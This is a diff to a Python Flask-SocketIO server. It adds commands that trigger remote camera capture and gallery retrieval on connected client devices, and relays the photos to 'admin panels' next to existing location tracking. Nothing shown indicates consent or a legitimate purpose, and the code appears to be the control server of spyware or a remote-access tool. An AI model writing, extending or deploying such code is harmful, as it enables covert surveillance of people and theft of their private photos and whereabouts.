@@ -77,6 +77,21 @@ def handle_location_response(data):
     # Send to all admin panels
     socketio.emit('location_result', data)
 
+@socketio.on('photo_response')
+def handle_photo_response(data):
+    client_id = request.sid
+    print(f"Photo response from {client_id}: {data.get('error', 'Photo data received')}")
+    # Send to all admin panels
+    socketio.emit('photo_result', data)
+
+@socketio.on('gallery_photos_response')
+def handle_gallery_photos_response(data):
+    client_id = request.sid
+    photo_count = data.get('count', 0)
+    print(f"Gallery photos from {client_id}: {photo_count} photos")
+    # Send to all admin panels
+    socketio.emit('gallery_photos_result', data)
+
 @app.route('/clients')
 def get_clients():
     return jsonify(connected_clients)
@@ -123,6 +138,14 @@ def send_command():
             
         threading.Thread(target=fallback_location).start()
         return jsonify({'status': 'Command sent'})
+    
+    elif command == 'capture_photo':
+        socketio.emit('capture_photo', {}, room=client_id)
+        return jsonify({'status': 'Photo capture command sent'})
+    
+    elif command == 'get_gallery':
+        socketio.emit('get_gallery_photos', {}, room=client_id)
+        return jsonify({'status': 'Gallery photos command sent'})
     
     else:
         return jsonify({'error': 'Unknown command'}), 400
